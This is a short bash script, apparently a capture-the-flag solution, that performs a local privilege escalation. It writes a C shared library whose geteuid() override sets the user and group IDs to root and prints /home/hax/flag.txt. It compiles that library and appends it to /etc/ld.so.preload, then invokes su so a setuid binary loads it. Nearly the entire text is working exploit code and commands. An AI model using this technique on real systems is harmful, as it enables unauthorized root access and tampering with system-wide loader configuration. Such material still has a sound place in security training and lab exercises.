#!/bin/bash

echo "[+] Writing exploit..."

cat << 'EOF' > poc.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

// gcc -shared -o /home/hax/libcustom.so -fPIC /home/hax/poc.c

uid_t geteuid(void)
{
    setresuid(0,0,0);
    setresgid(0,0,0);
    
    FILE *f = fopen("/home/hax/flag.txt", "r");
    int c;
    while ( (c = getc( f )) != EOF ) {
        putchar(c);
    }
    fclose( f );
    exit(0);

}
EOF

echo "[+] Compiling exploit..."
gcc -shared -o /home/hax/libcustom.so -fPIC /home/hax/poc.c 2>/dev/null

echo "[+] Running exploit"
echo "/home/hax/libcustom.so" >> /etc/ld.so.preload
su

